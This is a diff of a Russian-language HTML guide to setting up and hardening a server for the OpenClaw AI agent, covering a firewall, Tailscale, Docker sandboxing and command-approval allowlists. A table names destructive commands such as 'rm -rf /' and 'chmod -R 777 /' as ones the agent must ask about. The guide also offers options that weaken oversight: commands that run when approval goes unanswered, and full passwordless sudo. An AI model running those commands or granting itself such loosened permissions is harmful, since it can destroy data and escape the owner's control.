-                        <pre><code>curl -fsSL https://openclaw.bot/install.sh | bash</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>4. Запуск в фоне (daemon)</span>
-                            <button class="copy-btn" data-copy="openclaw onboard --install-daemon">Копировать</button>
-                        </div>
-                        <pre><code>openclaw onboard --install-daemon</code></pre>
-                    </div>
-
-                    <p>Теперь бот будет работать даже после перезагрузки сервера.</p>
-                </section>
-
-                <!-- Security Section -->
-                <section id="security">
-                    <h2>Безопасность — строим цифровой Форт-Нокс</h2>
-
-                    <p>Приготовься. Сейчас мы превратим твой сервер в неприступную крепость для твоего AI-лобстера. Паранойя здесь — не диагноз, а должностная инструкция.</p>
-
-                    <div class="callout callout-warning">
-                        <span class="callout-icon">&#9888;&#65039;</span>
-                        <div class="callout-content">
-                            <strong>Почему это важно?</strong>
-                            <p>OpenClaw имеет полный доступ к системе. Файлы, терминал, интернет — всё. Если ты пропустишь этот раздел, то, по сути, оставишь ключи от квартиры под ковриком с надписью «ключи здесь». В интернете. Где живут не самые добрые люди.</p>
-                        </div>
-                    </div>
-
-                    <!-- ЭТАП 1 -->
-                    <h3 id="security-user">Этап 1: Создаём «Козла отпущения»</h3>
-
-                    <p>Мы <strong>не</strong> работаем под <code>root</code>. Root — это бог сервера. Если хакер взломает бога, он удалит твою цифровую вселенную. Мы создадим простого смертного — отдельного пользователя, который будет «крайним» при любых проблемах.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Обновляем систему (чтобы не защищать дырявое решето)</span>
-                            <button class="copy-btn" data-copy="apt update && apt upgrade -y">Копировать</button>
-                        </div>
-                        <pre><code>apt update && apt upgrade -y</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Создаём пользователя</span>
-                            <button class="copy-btn" data-copy="adduser openuser">Копировать</button>
-                        </div>
-                        <pre><code>adduser openuser</code></pre>
-                    </div>
-
-                    <p>Система попросит пароль. Придумай сложный. Не «12345» — мы же параноики.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Даём право командовать (но только с паспортом)</span>
-                            <button class="copy-btn" data-copy="usermod -aG sudo openuser">Копировать</button>
-                        </div>
-                        <pre><code>usermod -aG sudo openuser</code></pre>
-                    </div>
-
-                    <div class="callout callout-danger">
-                        <span class="callout-icon">&#128721;</span>
-                        <div class="callout-content">
-                            <strong>Внимание!</strong>
-                            <p>Теперь выйди из root и зайди под новым пользователем <code>openuser</code>. Больше никакого root! Это как уйти с поста президента — добровольно и навсегда.</p>
-                        </div>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Переключаемся на нового пользователя</span>
-                            <button class="copy-btn" data-copy="su - openuser">Копировать</button>
-                        </div>
-                        <pre><code>su - openuser</code></pre>
-                    </div>
-
-                    <div class="callout callout-danger">
-                        <span class="callout-icon">&#128721;</span>
-                        <div class="callout-content">
-                            <strong>НЕ ПРОПУСТИ! Делаем пользователя «бессмертным»</strong>
-                            <p>По умолчанию Linux — строгий завхоз. Когда ты уходишь (закрываешь SSH), он гасит свет и убивает <em>все</em> процессы твоего пользователя. Включая бота. Ты закроешь терминал — бот умрёт. Откроешь снова — а он лежит. Каждый. Раз. Следующая команда это исправляет.</p>
-                        </div>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Разрешаем процессам жить после выхода из SSH</span>
-                            <button class="copy-btn" data-copy="sudo loginctl enable-linger openuser">Копировать</button>
-                        </div>
-                        <pre><code>sudo loginctl enable-linger openuser</code></pre>
-                    </div>
-
-                    <p>Что это делает? Говорит системе: «Этот пользователь — особенный. Не трогай его программы, даже когда он ушёл домой». Без этого любой systemd-сервис (а наш бот — это именно он) обречён на смерть при каждом выходе из терминала.</p>
-
-                    <!-- ЭТАП 2 -->
-                    <h3 id="security-firewall">Этап 2: Строим Великую Китайскую Стену</h3>
-
-                    <p>Сейчас твой сервер открыт всем ветрам интернета. Любой бот, сканер или скучающий хакер может постучаться в дверь. Мы замуруем все окна и двери, оставив только одну маленькую форточку для себя.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Ставим инструменты защиты</span>
-                            <button class="copy-btn" data-copy="sudo apt install ufw fail2ban -y">Копировать</button>
-                        </div>
-                        <pre><code>sudo apt install ufw fail2ban -y</code></pre>
-                    </div>
-
-                    <p><strong>UFW</strong> — это файрвол (стена). <strong>Fail2Ban</strong> — это охранник, который банит тех, кто слишком часто стучится с неправильным паролем.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Включаем защиту от перебора паролей</span>
-                            <button class="copy-btn" data-copy="sudo systemctl enable --now fail2ban">Копировать</button>
-                        </div>
-                        <pre><code>sudo systemctl enable --now fail2ban</code></pre>
-                    </div>
-
-                    <div class="callout callout-danger">
-                        <span class="callout-icon">&#128721;</span>
-                        <div class="callout-content">
-                            <strong>КРИТИЧЕСКИ ВАЖНО!</strong>
-                            <p>Следующая команда разрешает SSH. Если ты её пропустишь и включишь файрвол — ты запрёшь себя снаружи и потеряешь доступ к серверу. Навсегда. Это не шутка.</p>
-                        </div>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Разрешаем SSH (иначе потеряешь сервер!)</span>
-                            <button class="copy-btn" data-copy="sudo ufw allow ssh">Копировать</button>
-                        </div>
-                        <pre><code>sudo ufw allow ssh</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Запрещаем всё остальное</span>
-                            <button class="copy-btn" data-copy="sudo ufw default deny incoming">Копировать</button>
-                        </div>
-                        <pre><code>sudo ufw default deny incoming</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Включаем стену</span>
-                            <button class="copy-btn" data-copy="sudo ufw enable">Копировать</button>
-                        </div>
-                        <pre><code>sudo ufw enable</code></pre>
-                    </div>
-
-                    <p>Нажми <code>y</code> и Enter, когда спросит подтверждение. Поздравляю — твой сервер теперь за стеной.</p>
-
-                    <!-- ЭТАП 3 -->
-                    <h3 id="security-tailscale">Этап 3: Секретный подземный ход (Tailscale VPN)</h3>
-
-                    <p>Мы не будем открывать порты для панели управления ботом в интернет. Это для любителей острых ощущений и тех, кто верит в добрых хакеров. Мы пророем личный VPN-туннель.</p>
-
-                    <p><strong>Tailscale</strong> — это магия. Он создаёт защищённую сеть между твоими устройствами. Твой сервер и твой ноутбук становятся друзьями в закрытом клубе, куда посторонним вход воспрещён.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Устанавливаем Tailscale</span>
-                            <button class="copy-btn" data-copy="curl -fsSL https://tailscale.com/install.sh | sh">Копировать</button>
-                        </div>
-                        <pre><code>curl -fsSL https://tailscale.com/install.sh | sh</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Запускаем</span>
-                            <button class="copy-btn" data-copy="sudo tailscale up">Копировать</button>
-                        </div>
-                        <pre><code>sudo tailscale up</code></pre>
-                    </div>
-
-                    <p>В терминале появится ссылка. Скопируй её, вставь в браузер на своём <em>домашнем</em> компьютере и авторизуйся. Всё — теперь твой сервер и компьютер в одной защищённой сети.</p>
-
-                    <div class="callout callout-info">
-                        <span class="callout-icon">&#128161;</span>
-                        <div class="callout-content">
-                            <strong>Зачем Tailscale?</strong>
-                            <p>Без него тебе пришлось бы открывать порты наружу. С ним — панель управления OpenClaw доступна только тебе, через зашифрованный туннель. Бесплатно для личного использования.</p>
-                        </div>
-                    </div>
-
-                    <!-- ЭТАП 4 -->
-                    <h3 id="security-docker">Этап 4: Готовим камеру-одиночку (Docker и Node.js)</h3>
-
-                    <p>Наш AI-агент будет жить в «тюрьме» — Docker-контейнере. Если он вдруг сойдёт с ума и решит удалить все файлы — он разгромит только свою камеру, а не весь сервер. Это называется <strong>изоляция</strong>, и это наш лучший друг.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Устанавливаем Node.js 22+</span>
-                            <button class="copy-btn" data-copy="curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -">Копировать</button>
-                        </div>
-                        <pre><code>curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Завершаем установку Node.js</span>
-                            <button class="copy-btn" data-copy="sudo apt install -y nodejs">Копировать</button>
-                        </div>
-                        <pre><code>sudo apt install -y nodejs</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Проверяем версию (должно быть v22.x.x)</span>
-                            <button class="copy-btn" data-copy="node -v">Копировать</button>
-                        </div>
-                        <pre><code>node -v</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Устанавливаем Docker (нашу «тюрьму»)</span>
-                            <button class="copy-btn" data-copy="curl -fsSL https://get.docker.com | sh">Копировать</button>
-                        </div>
-                        <pre><code>curl -fsSL https://get.docker.com | sh</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Разрешаем пользователю управлять Docker без sudo</span>
-                            <button class="copy-btn" data-copy="sudo usermod -aG docker $USER">Копировать</button>
-                        </div>
-                        <pre><code>sudo usermod -aG docker $USER</code></pre>
-                    </div>
-
-                    <div class="callout callout-info">
-                        <span class="callout-icon">&#128161;</span>
-                        <div class="callout-content">
-                            <strong>Важно!</strong>
-                            <p>Чтобы права применились, нужно перезайти. Напиши <code>exit</code>, чтобы выйти, и снова <code>su - openuser</code> чтобы войти.</p>
-                        </div>
-                    </div>
-
-                    <!-- ЭТАП 5 -->
-                    <h3 id="security-install">Этап 5: Призываем Лобстера (Установка OpenClaw)</h3>
-
-                    <p>Момент истины. Устанавливаем самого AI-агента.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Устанавливаем OpenClaw глобально</span>
-                            <button class="copy-btn" data-copy="sudo npm install -g openclaw@latest">Копировать</button>
-                        </div>
-                        <pre><code>sudo npm install -g openclaw@latest</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Запускаем мастер настройки</span>
-                            <button class="copy-btn" data-copy="openclaw onboard --install-daemon">Копировать</button>
-                        </div>
-                        <pre><code>openclaw onboard --install-daemon</code></pre>
-                    </div>
-
-                    <p><strong>Как отвечать на вопросы мастера (режим паранойи):</strong></p>
-                    <ul>
-                        <li><strong>Gateway Location?</strong> → Выбери <code>Local</code></li>
-                        <li><strong>Authentication?</strong> → Выбери <code>Anthropic API Key</code> (или то, что у тебя есть)</li>
-                        <li><strong>Channels?</strong> → Выбери <code>Telegram</code></li>
-                    </ul>
-
-                    <div class="callout callout-info">
-                        <span class="callout-icon">&#129302;</span>
-                        <div class="callout-content">
-                            <strong>Telegram Token</strong>
-                            <p>Когда мастер попросит токен — напиши <a href="https://t.me/BotFather" target="_blank">@BotFather</a> в Telegram, создай нового бота командой <code>/newbot</code>, скопируй токен и вставь в терминал.</p>
-                        </div>
-                    </div>
-
-                    <div class="callout callout-warning">
-                        <span class="callout-icon">&#9888;&#65039;</span>
-                        <div class="callout-content">
-                            <strong>Allowed User — фейс-контроль</strong>
-                            <p>Когда спросит <strong>Allowed User</strong>: напиши боту <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a> в Telegram, узнай свой числовой ID и вставь его. Это фейс-контроль — только ты пройдёшь.</p>
-                        </div>
-                    </div>
-
-                    <!-- SCREENSHOT: Onboard wizard -->
-                    <figure class="guide-image">
-                        <div style="background: var(--bg-secondary); padding: 3rem; text-align: center; border: 2px dashed var(--border);">
-                            <p style="color: var(--text-secondary); margin: 0;">📸 СКРИНШОТ: Терминал с мастером настройки</p>
-                            <p style="color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.5rem;">Файл: <code>images/openclaw-onboard.png</code></p>
-                        </div>
-                        <figcaption>Мастер настройки openclaw onboard — выбор Telegram и ввод токена</figcaption>
-                    </figure>
-
-                    <!-- ЭТАП 6 -->
-                    <h3 id="security-config">Этап 6: Закручиваем гайки (Конфигурация)</h3>
-
-                    <p>Мастер создаёт <em>обычную</em> конфигурацию. Нам нужна <em>маниакальная</em>. Мы запретим боту слушать интернет и заставим его работать в наручниках.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Открываем файл настроек</span>
-                            <button class="copy-btn" data-copy="nano ~/.openclaw/openclaw.json">Копировать</button>
-                        </div>
-                        <pre><code>nano ~/.openclaw/openclaw.json</code></pre>
-                    </div>
-
-                    <p>Приведи файл к следующему виду (будь внимателен со скобками — это JSON!):</p>
-
-                    <div class="code-block large">
-                        <div class="code-header">
-                            <span>Конфигурация параноика (полная, боевая версия)</span>
-                            <button class="copy-btn" data-copy='{
-  "gateway": {
-    "port": 18789,
-    "mode": "local",
-    "bind": "loopback",
-    "trustedProxies": [
-      "127.0.0.1",
-      "::1"
-    ],
-    "auth": {
-      "mode": "token",
-      "token": "ПРИДУМАЙ_СЮДА_ОЧЕНЬ_ДЛИННЫЙ_ПАРОЛЬ_ТОКЕН"
-    },
-    "tailscale": {
-      "mode": "serve",
-      "resetOnExit": false
-    }
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>exec-approvals.json</span>
+                                <button class="copy-btn" data-copy='{
+  "version": 1,
+  "defaults": {
+    "security": "allowlist",
+    "ask": "on-miss",
+    "askFallback": "deny",
+    "autoAllowSkills": true
   },
   "agents": {
-    "defaults": {
-      "model": {
-        "primary": "google/gemini-3-pro-preview"
-      },
-      "sandbox": {
-        "mode": "all",
-        "workspaceAccess": "rw",
-        "scope": "session"
-      },
-      "maxConcurrent": 4
-    }
-  },
-  "channels": {
-    "telegram": {
-      "enabled": true,
-      "dmPolicy": "allowlist",
-      "groupPolicy": "allowlist",
-      "botToken": "ТВОЙ_ТОКЕН_ОТ_BOTFATHER",
-      "allowFrom": [
-        "ТВОЙ_ТЕЛЕГРАМ_ID_ЦИФРАМИ"
+    "main": {
+      "security": "allowlist",
+      "ask": "on-miss",
+      "askFallback": "deny",
+      "autoAllowSkills": true,
+      "allowlist": [
+        { "pattern": "/usr/bin/openclaw" },
+        { "pattern": "/usr/bin/ps" },
+        { "pattern": "/usr/bin/systemctl" },
+        { "pattern": "/usr/bin/tail" },
+        { "pattern": "/usr/bin/cat" },
+        { "pattern": "/usr/bin/ls" },
+        { "pattern": "/usr/bin/grep" },
+        { "pattern": "/usr/bin/find" }
       ]
     }
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>{
+  "version": 1,
+  "defaults": {
+    "security": "allowlist",
+    "ask": "on-miss",
+    "askFallback": "deny",
+    "autoAllowSkills": true
   },
-  "auth": {
-    "profiles": {
-      "google:default": {
-        "provider": "google",
-        "mode": "api_key"
-      }
+  "agents": {
+    "main": {
+      "security": "allowlist",
+      "ask": "on-miss",
+      "askFallback": "deny",
+      "autoAllowSkills": true,
+      "allowlist": [
+        { "pattern": "/usr/bin/openclaw" },
+        { "pattern": "/usr/bin/ps" },
+        { "pattern": "/usr/bin/systemctl" },
+        { "pattern": "/usr/bin/tail" },
+        { "pattern": "/usr/bin/cat" },
+        { "pattern": "/usr/bin/ls" },
+        { "pattern": "/usr/bin/grep" },
+        { "pattern": "/usr/bin/find" }
+      ]
     }
-  },
-  "hooks": {
-    "internal": {
-      "enabled": true,
-      "entries": {
-        "session-memory": {
-          "enabled": true
-        }
+  }
+}</code></pre>
+                        </div>
+
+                        <p><strong>Как это работает:</strong></p>
+                        <ul>
+                            <li><code>security: "allowlist"</code> — бот выполняет только команды из белого списка без вопросов</li>
+                            <li><code>ask: "on-miss"</code> — если команды нет в списке, бот спросит разрешение в Telegram</li>
+                            <li><code>askFallback: "deny"</code> — если ты не ответишь за ~120 сек, команда <strong>отклоняется</strong></li>
+                        </ul>
+
+                        <p><strong>Почему именно эти значения:</strong> <code>security: "allowlist"</code> + <code>ask: "on-miss"</code> — это официальный дефолт OpenClaw, рекомендуемый документацией. <code>askFallback: "deny"</code> — безопасный вариант: бот не выполнит ничего опасного без твоего подтверждения.</p>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Для продвинутых: <code>askFallback: "allow"</code></strong>
+                                <p>Если бот часто блокируется, когда ты недоступен — можно поменять на <code>"allow"</code>. Тогда при отсутствии ответа команда выполнится, но ты получишь уведомление. Удобнее, но менее безопасно.</p>
+                            </div>
+                        </div>
+
+                        <p><strong>Какие команды сознательно НЕ в allowlist:</strong></p>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Команда</th><th>Почему бот должен спросить</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>rm</code></td><td><code>rm -rf /</code> — катастрофа. Бот должен подтвердить удаление</td></tr>
+                                <tr><td><code>apt</code></td><td><code>apt remove</code> может снести системные пакеты</td></tr>
+                                <tr><td><code>dd</code></td><td>Прямая запись на диск — может уничтожить данные</td></tr>
+                                <tr><td><code>chmod</code></td><td><code>chmod -R 777 /</code> — открывает всё на запись</td></tr>
+                                <tr><td><code>chown</code></td><td>Смена владельца системных файлов</td></tr>
+                            </tbody>
+                        </table>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Частая проблема: симлинки</strong>
+                                <p>Allowlist проверяет <em>реальный путь</em> бинарника, а не симлинк. Например, <code>/usr/bin/python3</code> может быть симлинком на <code>/usr/bin/python3.12</code> — и в allowlist нужен именно <code>/usr/bin/python3.12</code>. Проверяйте через <code>readlink -f /usr/bin/python3</code>.</p>
+                            </div>
+                        </div>
+
+                        <p><strong>Три уровня команд по риску:</strong></p>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Уровень</th><th>Команды</th><th>Риск</th></tr></thead>
+                            <tbody>
+                                <tr><td>Наблюдение</td><td>ps, tail, cat, ls, grep, find, wc, head</td><td>Нулевой — только чтение</td></tr>
+                                <tr><td>Управление</td><td>openclaw, systemctl, docker, npm, kill</td><td>Средний — перезапуск сервисов</td></tr>
+                                <tr><td>Изменение</td><td>chmod, chown, cp, mv, mkdir, rm, sed, sudo</td><td>Высокий — запись и удаление файлов</td></tr>
+                            </tbody>
+                        </table>
+
+                        <h3>Уровень 3: Sudo и системный доступ (по желанию)</h3>
+
+                        <p>Для продвинутых задач (самообновление, перезапуск gateway) боту нужен sudo. Два варианта:</p>
+
+                        <p><strong>Вариант A — Ограниченный (безопаснее):</strong></p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>/etc/sudoers.d/neroot</span>
+                                <button class="copy-btn" data-copy="neroot ALL=(ALL) NOPASSWD: /usr/local/bin/openclaw
+neroot ALL=(ALL) NOPASSWD: /usr/bin/openclaw
+neroot ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart openclaw-gateway
+neroot ALL=(ALL) NOPASSWD: /usr/bin/systemctl status openclaw-gateway
+neroot ALL=(ALL) NOPASSWD: /usr/bin/npm">Копировать</button>
+                            </div>
+                            <pre><code>neroot ALL=(ALL) NOPASSWD: /usr/local/bin/openclaw
+neroot ALL=(ALL) NOPASSWD: /usr/bin/openclaw
+neroot ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart openclaw-gateway
+neroot ALL=(ALL) NOPASSWD: /usr/bin/systemctl status openclaw-gateway
+neroot ALL=(ALL) NOPASSWD: /usr/bin/npm</code></pre>
+                        </div>
+
+                        <p><strong>Вариант B — Полный доступ (для личного VPS):</strong></p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>/etc/sudoers.d/neroot</span>
+                                <button class="copy-btn" data-copy="neroot ALL=(ALL) NOPASSWD: ALL">Копировать</button>
+                            </div>
+                            <pre><code>neroot ALL=(ALL) NOPASSWD: ALL</code></pre>
+                        </div>
+
+                        <p><strong>Когда Вариант B — ОК:</strong> это личный VPS, exec-approvals + Telegram allowlist уже фильтруют кто и что может запустить. Ограниченный sudoers на практике приводит к «permission denied» на каждой новой команде.</p>
+
+                        <div class="callout callout-danger">
+                            <span class="callout-icon">&#9940;</span>
+                            <div class="callout-content">
+                                <strong>Важно: после создания файла</strong>
+                                <p><code>chmod 440 /etc/sudoers.d/neroot && visudo -cf /etc/sudoers.d/neroot</code> — обязательная проверка. Ошибка в sudoers может заблокировать sudo на сервере.</p>
+                            </div>
+                        </div>
+
+                        <h3>Уровень 4: Docker sandbox для субагентов (продвинутое)</h3>
+
+                        <p>Субагенты (параллельные задачи) работают в Docker-контейнере с ограничениями. Главный агент работает на хосте.</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — sandbox</span>
+                                <button class="copy-btn" data-copy='"agents": {
+  "defaults": {
+    "sandbox": {
+      "mode": "non-main",
+      "workspaceAccess": "rw",
+      "scope": "session",
+      "docker": {
+        "memory": "1536m",
+        "memorySwap": "2g",
+        "pidsLimit": 256,
+        "capDrop": ["ALL"],
+        "network": "openclaw-egress"
       }
     }
   }
 }'>Копировать</button>
-                        </div>
-                        <pre><code>{
-  "gateway": {
-    "port": 18789,
-    "mode": "local",
-    "bind": "loopback",
-    "trustedProxies": [
-      "127.0.0.1",
-      "::1"
-    ],
-    "auth": {
-      "mode": "token",
-      "token": "ПРИДУМАЙ_СЮДА_ОЧЕНЬ_ДЛИННЫЙ_ПАРОЛЬ_ТОКЕН"
-    },
-    "tailscale": {
-      "mode": "serve",
-      "resetOnExit": false
-    }
-  },
-  "agents": {
-    "defaults": {
-      "model": {
-        "primary": "google/gemini-3-pro-preview"
-      },
-      "sandbox": {
-        "mode": "all",
-        "workspaceAccess": "rw",
-        "scope": "session"
-      },
-      "maxConcurrent": 4
-    }
-  },
-  "channels": {
-    "telegram": {
-      "enabled": true,
-      "dmPolicy": "allowlist",
-      "groupPolicy": "allowlist",
-      "botToken": "ТВОЙ_ТОКЕН_ОТ_BOTFATHER",
-      "allowFrom": [
-        "ТВОЙ_ТЕЛЕГРАМ_ID_ЦИФРАМИ"
-      ]
-    }
-  },
-  "auth": {
-    "profiles": {
-      "google:default": {
-        "provider": "google",
-        "mode": "api_key"
-      }
-    }
-  },
-  "hooks": {
-    "internal": {
-      "enabled": true,
-      "entries": {
-        "session-memory": {
-          "enabled": true
-        }
+                            </div>
+                            <pre><code>"agents": {
+  "defaults": {
+    "sandbox": {
+      "mode": "non-main",
+      "workspaceAccess": "rw",
+      "scope": "session",
+      "docker": {
+        "memory": "1536m",
+        "memorySwap": "2g",
+        "pidsLimit": 256,
+        "capDrop": ["ALL"],
+        "network": "openclaw-egress"
       }
     }
   }
 }</code></pre>
-                    </div>
-
-                    <p><strong>Что мы тут натворили (и зачем каждая строчка):</strong></p>
-                    <ul>
-                        <li><code>"bind": "loopback"</code> — бот слушает только внутри сервера (127.0.0.1). Из интернета его не видно. Как будто у него нет адреса — почтальон не найдёт.</li>
-                        <li><code>"trustedProxies"</code> — <strong>без этого Tailscale не достучится до панели управления!</strong> Когда Tailscale проксирует запросы, OpenClaw видит их как «подозрительного незнакомца через прокси» и захлопывает дверь. Эта настройка говорит: «Расслабься, это свои».</li>
-                        <li><code>"tailscale": { "mode": "serve" }</code> — OpenClaw сам настроит интеграцию с Tailscale. Не нужно вручную танцевать с бубном и пробрасывать порты.</li>
-                        <li><code>"auth": { "mode": "token" }</code> — вход в панель управления только по токену. Как пароль от сейфа — без него никуда.</li>
-                        <li><code>"workspaceAccess": "rw"</code> — бот может читать <em>и писать</em> файлы. «Стоп, а разве <code>ro</code> не безопаснее?» — да, но в режиме read-only бот превращается в безрукого наблюдателя: не сможет написать код, создать файл или сохранить результат. А раз он и так сидит в Docker-контейнере (в тюрьме), <code>rw</code> внутри тюрьмы — это нормально.</li>
-                        <li><code>"dmPolicy": "allowlist"</code> — игнорировать всех незнакомцев в личных сообщениях. Написал случайный человек? Тишина.</li>
-                        <li><code>"groupPolicy": "allowlist"</code> — то же самое для групповых чатов. Без этого кто угодно может добавить бота в группу и кататься на твоём API-ключе (а это стоит денег).</li>
-                        <li><code>"model.primary"</code> — AI-модель по умолчанию. Здесь стоит Gemini, но можешь заменить на <code>anthropic/claude-sonnet-4-20250514</code>, <code>openai/gpt-4o</code> или другую поддерживаемую модель.</li>
-                        <li><code>"hooks.internal.session-memory"</code> — включает память между сессиями. Это то, ради чего мы всё затеяли: бот будет помнить контекст предыдущих разговоров. Без этого у него амнезия — как у рыбки из Дори.</li>
-                    </ul>
-
-                    <p>Сохрани файл: нажми <code>Ctrl + O</code>, потом <code>Enter</code>, потом <code>Ctrl + X</code>.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Перезагружаем бота</span>
-                            <button class="copy-btn" data-copy="openclaw gateway restart">Копировать</button>
                         </div>
-                        <pre><code>openclaw gateway restart</code></pre>
-                    </div>
 
-                    <!-- ЭТАП 7 -->
-                    <h3 id="security-permissions">Этап 7: Финальная зачистка (Права доступа)</h3>
+                        <table class="comparison-table">
+                            <thead><tr><th>Параметр</th><th>Значение</th><th>Зачем</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>mode: "non-main"</code></td><td>Sandbox только для субагентов</td><td>Main-агент работает на хосте без ограничений</td></tr>
+                                <tr><td><code>memory: "1536m"</code></td><td>Лимит RAM 1.5 ГБ</td><td>Защита от зацикливания</td></tr>
+                                <tr><td><code>pidsLimit: 256</code></td><td>Макс. 256 процессов</td><td>Защита от fork bomb</td></tr>
+                                <tr><td><code>capDrop: ["ALL"]</code></td><td>Убрать все capabilities</td><td>Контейнер не может менять сеть, монтировать FS</td></tr>
+                                <tr><td><code>network: "openclaw-egress"</code></td><td>Трафик через egress proxy</td><td>Дефолт = <code>"none"</code> (без сети). Мы меняем на egress для контролируемого доступа</td></tr>
+                            </tbody>
+                        </table>
 
-                    <p>Конфигурационные файлы содержат твои API-ключи и токены. Если кто-то их прочитает — он получит полный контроль над твоим ботом и твоими деньгами (API платный, помнишь?). Закрываем доступ.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Закрываем папку бота от посторонних</span>
-                            <button class="copy-btn" data-copy="chmod 700 ~/.openclaw">Копировать</button>
-                        </div>
-                        <pre><code>chmod 700 ~/.openclaw</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Закрываем конфиг</span>
-                            <button class="copy-btn" data-copy="chmod 600 ~/.openclaw/openclaw.json">Копировать</button>
-                        </div>
-                        <pre><code>chmod 600 ~/.openclaw/openclaw.json</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Закрываем папку с ключами</span>
-                            <button class="copy-btn" data-copy="chmod 700 ~/.openclaw/credentials">Копировать</button>
-                        </div>
-                        <pre><code>chmod 700 ~/.openclaw/credentials</code></pre>
-                    </div>
-
-                    <p><code>700</code> — только владелец может читать, писать и заходить.<br>
-                    <code>600</code> — только владелец может читать и писать.</p>
-
-                    <!-- ЭТАП 8 -->
-                    <h3 id="security-audit">Этап 8: Проверка на паранойю</h3>
-
-                    <p>У OpenClaw есть встроенный аудитор безопасности. Спросим его, достаточно ли мы защищены.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Запускаем глубокий аудит</span>
-                            <button class="copy-btn" data-copy="openclaw security audit --deep">Копировать</button>
-                        </div>
-                        <pre><code>openclaw security audit --deep</code></pre>
-                    </div>
-
-                    <!-- SCREENSHOT: Security audit -->
-                    <figure class="guide-image">
-                        <div style="background: var(--bg-secondary); padding: 3rem; text-align: center; border: 2px dashed var(--border);">
-                            <p style="color: var(--text-secondary); margin: 0;">📸 СКРИНШОТ: Результат security audit</p>
-                            <p style="color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.5rem;">Файл: <code>images/security-audit.png</code></p>
-                        </div>
-                        <figcaption>Зелёные галочки — всё настроено правильно</figcaption>
-                    </figure>
-
-                    <p>Если видишь зелёные галочки — поздравляю, ты построил цифровой бункер. Если есть красные предупреждения:</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Автоматическое исправление проблем</span>
-                            <button class="copy-btn" data-copy="openclaw security audit --fix">Копировать</button>
-                        </div>
-                        <pre><code>openclaw security audit --fix</code></pre>
-                    </div>
-
-                    <!-- Как зайти в панель -->
-                    <h3 id="security-access">Как теперь зайти в панель управления?</h3>
-
-                    <p>Ты не сможешь зайти по публичному IP-адресу сервера — мы же запретили это в этапах 2 и 6. Это фича, а не баг.</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Узнай IP сервера в сети Tailscale</span>
-                            <button class="copy-btn" data-copy="tailscale ip -4">Копировать</button>
-                        </div>
-                        <pre><code>tailscale ip -4</code></pre>
-                    </div>
-
-                    <p>На своём домашнем компьютере (где тоже установлен Tailscale) открой в браузере:</p>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>URL панели управления</span>
-                        </div>
-                        <pre><code>http://[IP-АДРЕС-TAILSCALE]:18789/?token=[ТВОЙ_ТОКЕН_ИЗ_КОНФИГА]</code></pre>
-                    </div>
-
-                    <!-- Чек-лист -->
-                    <h3 id="security-checklist">Чек-лист безопасности</h3>
-
-                    <p>Финальная проверка. Всё ли ты сделал?</p>
-
-                    <div class="checklist">
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Создан отдельный пользователь (не root)</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>loginctl enable-linger включён для пользователя</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>UFW включён, SSH разрешён</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Fail2Ban установлен и запущен</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
